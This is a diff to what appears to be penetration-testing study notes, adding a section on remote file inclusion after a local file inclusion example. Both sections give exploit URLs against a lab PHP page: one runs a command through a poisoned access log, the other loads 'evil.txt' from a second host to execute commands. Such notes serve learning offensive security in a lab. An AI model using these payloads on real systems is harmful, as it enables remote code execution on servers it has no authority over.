@@ -711,3 +711,9 @@ Then exploit it. It seems that if the file contains some php inside it's already
 ```
 http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
 ```
+
+### Remote file inclusion
+Same as LFI but the referenced file is a remote one. Loading external files like this isn't generally not allowed though. But it makes it easier:
+```
+http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
+```
